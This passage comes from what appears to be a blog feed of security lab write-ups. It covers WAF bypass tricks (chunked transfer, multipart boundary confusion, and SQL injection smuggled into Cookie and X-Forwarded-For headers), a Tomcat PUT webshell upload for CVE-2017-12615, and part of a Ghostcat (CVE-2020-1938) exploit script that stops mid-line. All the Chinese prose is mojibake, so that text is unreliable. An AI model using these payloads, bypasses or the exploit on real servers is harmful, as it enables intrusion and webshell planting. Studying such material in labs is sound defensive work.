alt="image-20240423160317250"></p><p>ä½†æ˜¯å¾ˆé—æ†¾ä»–æŸ¥ä¸å‡ºä¸œè¥¿æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œæˆ‘çœ‹ç½‘ä¸Šéƒ½æ˜¯ç”¨sqli-labæ¥åšæ¼”ç¤ºæ˜¯å¯ä»¥çš„ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯é¶åœºé—®é¢˜ï¼Œè¿™é‡Œæ‡’å¾—å†æ­ä¸€ä¸ªçŸ¥é“åˆ†å—ä¼ è¾“æ€ä¹ˆç”¨å°±è¡Œäº†ï¼ˆ</p><p><strong>æ–‡ä»¶ä¸Šä¼ åˆ†å—ç»•è¿‡</strong></p><p>è¿™é‡Œé€‰æ‹©ç¬¬ä¸€ä¸ªclient checkå…³å¡</p><p>ä¸Šä¼ å›¾ç‰‡æ˜¯æ­£å¸¸çš„</p><p><img src="http://cdn.clown2024.cn/202407151445876.png" alt="image-20240423160746018"></p><blockquote><p>xsä¸è¿‡ä»–å®‰å…¨ç‹—æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å†…å®¹ä¼¼ä¹</p></blockquote><p>ç„¶åæ”¹æˆphpå°±ä¼šå˜æˆ500</p><p><img src="http://cdn.clown2024.cn/202407151445877.png" alt="image-20240423160840426"></p><p><img src="http://cdn.clown2024.cn/202407151445878.png" alt="image-20240423160856459"></p><p>ç„¶åä½¿ç”¨åˆ†å—ä¼ è¾“</p><p><img src="http://cdn.clown2024.cn/202407151445879.png" alt="image-20240423161111604"></p><p>éš¾ç»·è¿˜æ˜¯æ²¡æœ‰æˆåŠŸï¼Œå®‰å…¨ç‹—ä¸æ‹¦æˆªäº†æ„Ÿè§‰æ˜¯æœåŠ¡å™¨è§£æçš„é—®é¢˜ï¼Œå¯èƒ½æœåŠ¡å™¨ä¸å¤ªæ”¯æŒåˆ†å—ä¼ è¾“ï¼Œåæ­£æˆ‘çœ‹åˆ«äººçš„éƒ½æ˜¯å¯ä»¥çš„ï¼ˆ</p><h3 id="å»¶æ—¶åˆ†å—ä¼ è¾“"><a href="#å»¶æ—¶åˆ†å—ä¼ è¾“" class="headerlink" title="å»¶æ—¶åˆ†å—ä¼ è¾“"></a>å»¶æ—¶åˆ†å—ä¼ è¾“</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/weixin_43571641/article/details/123749544">https://blog.csdn.net/weixin_43571641/article/details/123749544</a></p><p>å› ä¸ºç°åœ¨å¾ˆå¤šwafä¹Ÿå¯ä»¥è¯†åˆ«åˆ†å—ä¼ è¾“ï¼Œæ£€æµ‹æ­¥éª¤ä¸€èˆ¬å¦‚ä¸‹ï¼š</p><ol><li>å‘ç°æ•°æ®åŒ…æ˜¯åˆ†å—ä¼ è¾“ï¼Œå¯åŠ¨åˆ†å—ä¼ è¾“çº¿ç¨‹è¿›è¡Œæ¥æ”¶</li><li>åˆ†å—ä¼ è¾“çº¿ç¨‹ä¸æ–­æ¥æ”¶å®¢æˆ·ç«¯ä¼ æ¥çš„åˆ†å—ï¼Œç›´åˆ°æ¥æ”¶åˆ°<code>0\r\n\r\n</code></li><li>å°†æ‰€æœ‰åˆ†å—åˆå¹¶ï¼Œå¹¶æ£€æµ‹åˆå¹¶ä¹‹åçš„å†…å®¹</li></ol><p>è€Œå»¶æ—¶åˆ†å—ä¼ è¾“å°±æ˜¯åœ¨è¿™åŸºç¡€ä¹‹ä¸Šï¼Œåœ¨ä¸Šä¸€å—ä¼ è¾“å®Œæˆåsleepä¸€æ®µæ—¶é—´ï¼Œå†å‘é€ä¸‹ä¸€å—ï¼Œç›®çš„æ˜¯åœ¨2é˜¶æ®µå»¶é•¿WAFåˆ†å—ä¼ è¾“çº¿ç¨‹çš„ç­‰å¾…æ—¶é—´ï¼Œä»è€Œæ¶ˆè€—WAFæ€§èƒ½ã€‚</p><p>å»¶æ—¶åˆ†å—ä¼ è¾“å¯ä»¥ä½¿ç”¨<code>chunked-coding-converter</code>æ’ä»¶ï¼Œè¿™é‡Œæ”¾ä¸€å¼ åŸç†å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151445881.png" alt="img"></p><blockquote><p>æ³¨æ„ï¼šå—ä¸å—ä¹‹é—´å‘é€çš„é—´éš”æ—¶é—´å¿…é¡»è¦å°äºåç«¯ä¸­é—´ä»¶çš„post timeout,Tomcaté»˜è®¤æ˜¯20s,weblogicæ˜¯30sã€‚</p></blockquote><h2 id="boundaryè¾¹ç•Œæ··æ·†ç»•è¿‡"><a href="#boundaryè¾¹ç•Œæ··æ·†ç»•è¿‡" class="headerlink" title="boundaryè¾¹ç•Œæ··æ·†ç»•è¿‡"></a>boundaryè¾¹ç•Œæ··æ·†ç»•è¿‡</h2><h3 id="boundaryä»‹ç»"><a href="#boundaryä»‹ç»" class="headerlink" title="boundaryä»‹ç»"></a>boundaryä»‹ç»</h3><p>å…ˆäº†è§£ä¸€ä¸‹boundaryè¾¹ç•Œï¼š</p><p>boundayå°±æ˜¯ä½¿ç”¨multipart&#x2F;form-dataä¼ é€’è¯·æ±‚æ—¶ç”¨äºåŒºåˆ†ä¼ è¾“æ•°æ®çš„ä¸åŒéƒ¨åˆ†ï¼Œä»–çš„è¯·æ±‚ä½“ä¼šç±»ä¼¼è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">POST /submit-form HTTP/1.1<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX2xgCtC5TrfYuPLo<br><br>------WebKitFormBoundaryX2xgCtC5TrfYuPLo<br>Content-Disposition: form-data; name=&quot;text&quot;<br><br>Hello, World!<br>------WebKitFormBoundaryX2xgCtC5TrfYuPLo<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;example.txt&quot;<br>Content-Type: text/plain<br><br>è¿™æ˜¯æ–‡ä»¶çš„å†…å®¹ã€‚<br>------WebKitFormBoundaryX2xgCtC5TrfYuPLo--<br></code></pre></td></tr></table></figure><p>å…¶ä¸­çš„boundaryå®šä¹‰çš„å°±æ˜¯åˆ†å‰²è¾¹ç•Œ</p><p>æ€»ç»“ä¸‹æ¥ä¸€ä¸ªå…¸å‹çš„ <code>multipart/form-data</code> è¯·æ±‚ä½“åŒ…å«ä»¥ä¸‹éƒ¨åˆ†ï¼š</p><ul><li><strong>è¾¹ç•Œå­—ç¬¦ä¸²</strong>ï¼šæ¯ä¸ªæ•°æ®éƒ¨åˆ†çš„å¼€å§‹å’Œç»“æŸéƒ½ç”±è¾¹ç•Œå­—ç¬¦ä¸²æ ‡è¯†ã€‚</li><li><strong>å†…å®¹æè¿°</strong>ï¼šæ¯ä¸ªéƒ¨åˆ†çš„å¼€å§‹éƒ½æœ‰ä¸€ä¸ª <code>Content-Disposition</code> å¤´ï¼Œæè¿°äº†è¯¥éƒ¨åˆ†çš„å­—æ®µåã€æ–‡ä»¶åç­‰ä¿¡æ¯ã€‚</li><li><strong>å†…å®¹ç±»å‹</strong>ï¼šå¯é€‰çš„ <code>Content-Type</code> å¤´ï¼ŒæŒ‡ç¤ºäº†æ•°æ®çš„ç±»å‹ï¼Œå¦‚ <code>text/plain</code> æˆ– <code>image/jpeg</code>ã€‚</li><li><strong>æ•°æ®æœ¬èº«</strong>ï¼šå­—æ®µå€¼æˆ–æ–‡ä»¶å†…å®¹ã€‚</li></ul><h3 id="æ··æ·†ç»•è¿‡"><a href="#æ··æ·†ç»•è¿‡" class="headerlink" title="æ··æ·†ç»•è¿‡"></a>æ··æ·†ç»•è¿‡</h3><p>å³æˆ‘ä»¬å¯ä»¥å¯¹boundaryçš„å®šä¹‰æ·»åŠ ä¸€äº›è‡ªå®šä¹‰çš„boundaryæ¥è¿›è¡Œç»•è¿‡</p><p>boundaryæœ‰è¿™æ ·ä¸€äº›ç‰¹æ€§ï¼š</p><ol><li>boundaryçš„ç»“æŸæ ‡å¿—ä¸ä¸€è‡´æ—¶å¯ä»¥æ­£å¸¸å“åº”ï¼Œå¼€å§‹æ ‡å¿—ä¸ä¸€è‡´æ—¶åˆ™ä¸èƒ½æ­£å¸¸å“åº”</li><li>å½“æœ‰å¤šä¸ªboundaryå®šä¹‰æ—¶åªæœ‰ç¬¬ä¸€ä¸ªèµ·ä½œç”¨</li></ol><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ å¤šä¸ªboundaryå’Œä¿®æ”¹boundaryç»“æŸæ ‡å¿—æ¥è¾¾åˆ°æ··æ·†çš„æ•ˆæœï¼Œè¿™é‡Œç”¨pikachuå’Œå®‰å…¨ç‹—æµ‹è¯•ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢åˆ†å—ä¼ è¾“çš„æµ‹è¯•åœ°æ–¹</p><p>è¿™é‡Œå¤šåŠ äº†ä¸€ä¸ªboundaryå°±æˆåŠŸç»•è¿‡äº†</p><p><img src="http://cdn.clown2024.cn/202407151445882.png" alt="image-20240423164150994"></p><p>æˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹çœ‹çœ‹</p><p><img src="http://cdn.clown2024.cn/202407151445883.png" alt="image-20240423164248964"></p><p>å‘ç°å·²ç»æˆåŠŸç»•è¿‡äº†ï¼Œä½†æ˜¯å†…å®¹æ£€æµ‹å¼‚å¸¸æ‰€ä»¥è¢«æ‹¦äº†ï¼Œæˆ‘å°±è¯´æ€ä¹ˆä¸æ£€æµ‹å†…å®¹åœ¨è¿™ç­‰ç€æˆ‘åŸæ¥ã€‚</p><h2 id="cookiex2fx-forwarded-foræ³¨å…¥ç»•è¿‡"><a href="#Cookie-X-Forwarded-Foræ³¨å…¥ç»•è¿‡" class="headerlink" title="Cookie&#x2F;X-Forwarded-Foræ³¨å…¥ç»•è¿‡"></a>Cookie&#x2F;X-Forwarded-Foræ³¨å…¥ç»•è¿‡</h2><p>éƒ¨åˆ†WAFå¯èƒ½åªå¯¹GETï¼ŒPOSTæäº¤çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œæœªå¯¹Cookieæˆ–è€…X-Forwarded-Forè¿›è¡Œæ£€æµ‹ï¼Œå¯é€šè¿‡cookieæˆ–è€…X-Forwarded-Foræäº¤æ³¨å…¥å‚æ•°è¯­å¥è¿›è¡Œç»•è¿‡ã€‚</p><p>æ¯”å¦‚è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">GET /index.aspx HTTP/1.1<br>Host: 192.168.61.175<br>Cookie:TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28; id=1+and+1=1;<br>X-Forwarded-For:127.0.0.1&#x27;;WAITFOR DELAY&#x27;0:0:5&#x27;--<br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨piplineç»•è¿‡"><a href="#åˆ©ç”¨piplineç»•è¿‡" class="headerlink" title="åˆ©ç”¨piplineç»•è¿‡"></a>åˆ©ç”¨piplineç»•è¿‡</h2><p>å½“è¯·æ±‚ä¸­çš„Connectionå­—æ®µå€¼ä¸ºkeep-aliveï¼Œåˆ™ä»£è¡¨æœ¬æ¬¡å‘èµ·çš„è¯·æ±‚æ‰€å»ºç«‹çš„tcpè¿æ¥ä¸æ–­å¼€ï¼Œç›´åˆ°æ‰€å‘é€å†…å®¹ç»“æŸConnectionä¸ºcloseä¸ºæ­¢ã€‚éƒ¨åˆ†WAFå¯èƒ½åªå¯¹ç¬¬ä¸€æ¬¡ä¼ è¾“è¿‡æ¥çš„è¯·æ±‚è¿›è¡Œè¿‡æ»¤å¤„ç†ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å…ˆå…³é—­burpçš„Repeaterçš„Content-Lengthè‡ªåŠ¨æ›´æ–°ï¼Œç„¶åä¿®æ”¹connectionçš„å€¼ä¸ºkeep-aliveï¼Œå°†æ”»å‡»è¯­å¥é™„åŠ åˆ°æ­£å¸¸è¯·æ±‚åé¢å†å‘é€ä¸€æ¬¡ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> waf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcatå¸¸è§æ¼æ´</title>
      <link href="/2024/04/21/Tomcat%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/04/21/Tomcat%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>æ¥å­¦ä¹ ä¸€ä¸‹Tomcatå¸¸è§çš„æ¼æ´ã€‚</p><h1 id="tomcatæ˜¯ä»€ä¹ˆ"><a href="#Tomcatæ˜¯ä»€ä¹ˆ" class="headerlink" title="Tomcatæ˜¯ä»€ä¹ˆ"></a>Tomcatæ˜¯ä»€ä¹ˆ</h1><p>tomcatå°±æ˜¯ä¸€ä¸ªå…è´¹çš„webæœåŠ¡å™¨ï¼Œå’Œapacheç›¸åŒæ€§è´¨ï¼Œä¸»è¦ç”¨äºjspæ¡†æ¶çš„ç½‘ç«™ï¼Œå¯ä»¥çœ‹ä½œæ˜¯apacheçš„ä¸€ä¸ªæ‰©å±•ï¼Œä½†æ˜¯è¿è¡Œçš„æ—¶å€™æ˜¯å’Œapacheå±äºä¸åŒè¿›ç¨‹çš„ã€‚</p><p><strong>Tomcatçš„ç›®å½•ç»“æ„</strong></p><ul><li>binï¼šå­˜æ”¾tomcatçš„è„šæœ¬æ–‡ä»¶ï¼Œä¾‹å¦‚å¯åŠ¨ã€å…³é—­</li><li>confï¼šå­˜æ”¾tomcatçš„é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚server.xmlã€web.xml</li><li>libï¼šå­˜æ”¾tomcatè¿è¡Œæ‰€éœ€è¦çš„åº“æ–‡ä»¶ï¼ˆjaråŒ…ï¼‰</li><li>logï¼šå­˜æ”¾tomcatæ‰§è¡Œæ—¶çš„logæ–‡ä»¶</li><li>tempï¼šå­˜æ”¾tomcatè¿è¡Œæ—¶äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶</li><li>webappsï¼šWebå‘å¸ƒç›®å½•ï¼Œé»˜è®¤æƒ…å†µä¸‹Webåº”ç”¨æ–‡ä»¶å­˜æ”¾äºæ­¤ç›®å½•</li><li>workï¼šå­˜æ”¾jspç¼–è¯‘åäº§ç”Ÿçš„classæ–‡ä»¶</li></ul><p><img src="http://cdn.clown2024.cn/202407151443224.png" alt="image-20240425103309597"></p><blockquote><p>ä»‹ç»ä¸€äº›é‡è¦çš„é…ç½®æ–‡ä»¶ï¼š</p><p><code>server.xml</code>ï¼šé…ç½®tomcatçš„å¯åŠ¨ç«¯å£å·ã€hostä¸»æœºã€Contextç­‰</p><p><code>web.xml</code>ï¼šéƒ¨ç½²æè¿°æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æè¿°äº†ä¸€äº›é»˜è®¤çš„servletï¼Œéƒ¨ç½²æ¯ä¸ªwebappæ—¶éƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–‡ä»¶</p><p><code>tomcat-users.xml</code>ï¼štomcatçš„ç”¨æˆ·å¯†ç ä¸æƒé™</p></blockquote><h1 id="å¸¸è§ç»•è¿‡æ‰‹æ³•"><a href="#å¸¸è§ç»•è¿‡æ‰‹æ³•" class="headerlink" title="å¸¸è§ç»•è¿‡æ‰‹æ³•"></a>å¸¸è§ç»•è¿‡æ‰‹æ³•</h1><p><strong>Windows</strong></p><ul><li>åˆ©ç”¨&#x2F;shell.jsp::$DATAæ–¹å¼ç»•è¿‡</li><li>&#x2F;shell.jsp%20ç©ºæ ¼ç»•è¿‡</li><li>&#x2F;shell.jsp&#x2F; ç»•è¿‡ï¼ŒTomcatåœ¨å¤„ç†æ–‡ä»¶æ—¶ä¼šåˆ é™¤æœ€åçš„&#x2F;</li></ul><blockquote><p>åœ¨Windowsæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œ<code>::$DATA</code> æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æµåç§°ï¼Œå®ƒç”¨äºè®¿é—®NTFSæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ›¿ä»£æ•°æ®æµï¼ˆAlternate Data Streamï¼ŒADSï¼‰ã€‚ADSæ˜¯NTFSæ–‡ä»¶ç³»ç»Ÿæä¾›çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå…è®¸åœ¨åŒä¸€ä¸ªæ–‡ä»¶è®°å½•ä¸Šå­˜å‚¨å¤šä¸ªæ•°æ®æµã€‚é™¤äº†é»˜è®¤çš„æ•°æ®æµï¼ˆé€šå¸¸ç”¨äºå­˜å‚¨æ–‡ä»¶å†…å®¹ï¼‰ï¼Œå¯ä»¥åˆ›å»ºä»»æ„æ•°é‡çš„å‘½åæ•°æ®æµã€‚</p><p>å½“ä½¿ç”¨ <code>filename::$DATA</code> è¿™æ ·çš„æ ¼å¼è®¿é—®æ–‡ä»¶æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå¿½ç•¥æ–‡ä»¶çš„æ‰©å±•åï¼Œç›´æ¥æ“ä½œæ–‡ä»¶çš„é»˜è®¤æ•°æ®æµã€‚</p></blockquote><p><strong>Linux</strong></p><p>&#x2F;shell.jsp&#x2F;ç»•è¿‡ï¼ŒTomcatåœ¨å¤„ç†æ–‡ä»¶æ—¶ä¼šåˆ é™¤æœ€åçš„&#x2F;</p><h1 id="tomcatå¸¸è§æ¼æ´"><a href="#Tomcatå¸¸è§æ¼æ´" class="headerlink" title="Tomcatå¸¸è§æ¼æ´"></a>Tomcatå¸¸è§æ¼æ´</h1><h2 id="tomcatä»»æ„æ–‡ä»¶å†™å…¥"><a href="#Tomcatä»»æ„æ–‡ä»¶å†™å…¥" class="headerlink" title="Tomcatä»»æ„æ–‡ä»¶å†™å…¥"></a>Tomcatä»»æ„æ–‡ä»¶å†™å…¥</h2><p><strong>CVE-2017-12615</strong></p><p>è¿™é‡Œå¼€ä¸€ä¸ªvolfocusé¶åœºæ¥è¿›è¡Œå¤ç°ã€‚</p><ul><li>å½±å“ç‰ˆæœ¬ï¼š7.0.0-7.0.79</li><li>å½±å“è¯´æ˜ï¼šä¸Šä¼ webshellï¼Œä»»æ„å‘½ä»¤æ‰§è¡Œ</li><li>ç¯å¢ƒè¯´æ˜ï¼šTomcat 8.5.19</li></ul><p><img src="http://cdn.clown2024.cn/202407151443225.png" alt="image-20240425110308845"></p><p><strong>æ¼æ´åŸç†</strong></p><p>è¯¥æ¼æ´æ˜¯åˆ©ç”¨PUTè¯·æ±‚æ–¹æ³•ä»»æ„å†™å…¥æ–‡ä»¶ï¼Œç±»ä¼¼IISçš„PUTä¸Šä¼ æ¼æ´ï¼›æ‰€ä»¥å¯ä»¥åˆ©ç”¨PUTæ–¹æ³•ä¸Šä¼ webshellåˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>åœ¨Tomcatçš„web.xmlé»˜è®¤ä¸‹ä¸å­˜åœ¨è¯¥æ¼æ´ï¼Œä½†å¦‚æœå°†å…¶ä¸­çš„readonlyè®¾ç½®ä¸ºfalseï¼Œå°±å¯ä»¥é€šè¿‡PUT&#x2F;DELETEè¿›è¡Œæ–‡ä»¶æ“æ§ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151443226.png" alt="image-20240425110654190"></p><p><strong>å¼€å§‹å¤ç°</strong></p><p>è¿™ä¸ªtomcatçš„ç‰ˆæœ¬å¾ˆé«˜ä½†æ˜¯å­˜åœ¨æ¼æ´ï¼Œè¯æ˜readonlyè®¾ç½®ä¸ºäº†falseï¼Œæˆ‘ä»¬å¯ä»¥å»éªŒè¯ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151443227.png" alt="image-20240425111140997"></p><p>å¯ä»¥çœ‹åˆ°è®¾ç½®äº†ä¸ºfalseï¼Œæ¥ä¸‹æ¥ç”¨putä¼ æ–‡ä»¶éªŒè¯ä¸€ä¸‹ï¼Œå…ˆæŠ“ä¸ªåŒ…</p><p><img src="http://cdn.clown2024.cn/202407151443228.png" alt="image-20240425135351443"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸå†™å…¥ï¼Œæˆ‘ä¹ˆå»å®¹å™¨éªŒè¯ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151443229.png" alt="image-20240425135427611"></p><p><img src="http://cdn.clown2024.cn/202407151443230.png" alt="image-20240425135619970"></p><p>é‚£æˆ‘ä»¬ç°åœ¨å°±å¯ä»¥å†™ä¸€ä¸ªwebshellè¿›å»äº†</p><p>ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¸Šä¼ jspæ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151443231.png" alt="image-20240425140340131"></p><p>æ‰€ä»¥å°±éœ€è¦åˆ©ç”¨ä¸Šé¢æåˆ°çš„ç»•è¿‡æ‰‹æ³•äº†ï¼Œæ¯”å¦‚åé¢åŠ ä¸€ä¸ª&#x2F;ï¼Œè¿™é‡Œç”¨å“¥æ–¯æ‹‰ç”Ÿæˆä¸€ä¸ªjspçš„shellï¼Œç„¶åä¸Šä¼ </p><p><img src="http://cdn.clown2024.cn/202407151443232.png" alt="image-20240425140746258"></p><p><img src="http://cdn.clown2024.cn/202407151443233.png" alt="image-20240425140919617"></p><p>ç„¶åå»è¿æ¥å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151443234.png" alt="image-20240425141224771"></p><h2 id="tomcatä»»æ„æ–‡ä»¶è¯»å–"><a href="#Tomcatä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="Tomcatä»»æ„æ–‡ä»¶è¯»å–"></a>Tomcatä»»æ„æ–‡ä»¶è¯»å–</h2><p><strong>CVE-2020-1938</strong></p><ul><li>å½±å“ç‰ˆæœ¬ï¼š9.x&lt;9.0.31ï¼Œ8.x&lt;8.5.51ï¼Œ7.x&lt;7.0.100ï¼Œ6.x</li><li>å½±å“è¯´æ˜ï¼šè¯»å–webappä¸‹çš„æ‰€æœ‰æ–‡ä»¶</li></ul><p><strong>æ¼æ´åŸç†</strong></p><p>è¯¥æ¼æ´æ˜¯ç”±äºTomcat AJPåè®®å­˜åœ¨ç¼ºé™·è€Œå¯¼è‡´ï¼Œç”±äºtomcaté»˜è®¤å¼€å¯çš„AJPæœåŠ¡(8009ç«¯å£)å­˜åœ¨ä¸€å¤„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨webappä¸‹çš„ä»»æ„æ–‡ä»¶ã€‚è‹¥ç›®æ ‡æœåŠ¡å™¨åŒæ—¶å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯è¿›ä¸€æ­¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ </p><p>è¿™é‡Œæ˜¯ä¸€å¼ tomcatçš„æ¶æ„å›¾ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151443235.png" alt="img"></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼ŒTomcatæœ€é¡¶å±‚çš„å®¹å™¨æ˜¯Serverï¼Œå…¶ä¸­åŒ…å«è‡³å°‘ä¸€ä¸ªæˆ–è€…å¤šä¸ªServiceï¼Œä¸€ä¸ªServiceæœ‰å¤šä¸ªConnectorå’Œä¸€ä¸ªContainerç»„æˆã€‚è¿™ä¸¤ä¸ªç»„ä»¶çš„ä½œç”¨ä¸º:</p><ol><li>Connectorç”¨äºå¤„ç†è¿æ¥ç›¸å…³çš„äº‹æƒ…ï¼Œå¹¶æä¾›Socketä¸Requestå’ŒResponseç›¸å…³çš„è½¬åŒ–ã€‚</li><li>Containerç”¨äºå°è£…å’Œç®¡ç†Servletï¼Œä»¥åŠå…·ä½“å¤„ç†Requestè¯·æ±‚ã€‚</li></ol><p>tomcaté»˜è®¤çš„ conf&#x2F;server.xmlä¸­é…ç½®äº†2ä¸ª Connectorï¼Œä¸€ä¸ªä¸º8080çš„å¯¹å¤–æä¾›çš„HTTPåè®®(1.1ç‰ˆæœ¬)ç«¯å£ï¼Œé»˜è®¤ç›‘å¬åœ°å€:0.0.0.0:8080ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯é»˜è®¤çš„8009 AJPåè®®(1.3ç‰ˆæœ¬)ç«¯å£é»˜è®¤ç›‘å¬åœ°å€ä¸º:0.0.0.0:8009ï¼Œä¸¤ä¸ªç«¯å£é»˜è®¤å‡ç›‘å¬åœ¨å¤–ç½‘ipã€‚</p><p>è¿™é‡Œå¤ç°åˆ©ç”¨ç½‘ä¸Šçš„ä¸€ä¸ªè„šæœ¬ï¼š<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi%EF%BC%8C%E8%BF%99%E9%87%8C%E8%B4%B4%E4%B8%80%E4%B8%8B%E8%84%9A%E6%9C%AC%EF%BC%9A">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfiï¼Œè¿™é‡Œè´´ä¸€ä¸‹è„šæœ¬ï¼š</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span><br><span class="hljs-comment">#by ydhcui</span><br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-comment"># Some references:</span><br><span class="hljs-comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack_string</span>(<span class="hljs-params">s</span>):<br><span class="hljs-keyword">if</span> s <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&gt;h&quot;</span>, -<span class="hljs-number">1</span>)<br>l = <span class="hljs-built_in">len</span>(s)<br><span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&gt;H%dsb&quot;</span> % l, l, s.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>), <span class="hljs-number">0</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unpack</span>(<span class="hljs-params">stream, fmt</span>):<br>size = struct.calcsize(fmt)<br>buf = stream.read(size)<br><span class="hljs-keyword">return</span> struct.unpack(fmt, buf)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unpack_string</span>(<span class="hljs-params">stream</span>):<br>size, = unpack(stream, <span class="hljs-string">&quot;&gt;h&quot;</span>)<br><span class="hljs-keyword">if</span> size == -<span class="hljs-number">1</span>: <span class="hljs-comment"># null string</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>res, = unpack(stream, <span class="hljs-string">&quot;%ds&quot;</span> % size)<br>stream.read(<span class="hljs-number">1</span>) <span class="hljs-comment"># \0</span><br><span class="hljs-keyword">return</span> res<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NotFoundException</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br><span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AjpBodyRequest</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-comment"># server == web server, container == servlet</span><br>SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)<br>MAX_REQUEST_LENGTH = <span class="hljs-number">8186</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data_stream, data_len, data_direction=<span class="hljs-literal">None</span></span>):<br>self.data_stream = data_stream<br>self.data_len = data_len<br>self.data_direction = data_direction<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">serialize</span>(<span class="hljs-params">self</span>):<br>data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&gt;bbH&quot;</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x00</span>)<br><span class="hljs-keyword">else</span>:<br>res = struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-built_in">len</span>(data))<br>res += data<br><span class="hljs-keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:<br>header = struct.pack(<span class="hljs-string">&quot;&gt;bbH&quot;</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x34</span>, <span class="hljs-built_in">len</span>(res))<br><span class="hljs-keyword">else</span>:<br>header = struct.pack(<span class="hljs-string">&quot;&gt;bbH&quot;</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-built_in">len</span>(res))<br><span class="hljs-keyword">return</span> header + res<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_and_receive</span>(<span class="hljs-params">self, socket, stream</span>):<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>data = self.serialize()<br>socket.send(data)<br>r = AjpResponse.receive(stream)<br><span class="hljs-keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="hljs-keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:<br>r = AjpResponse.receive(stream)<br><br><span class="hljs-keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">4</span>:<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">class</span> <span class="hljs-title 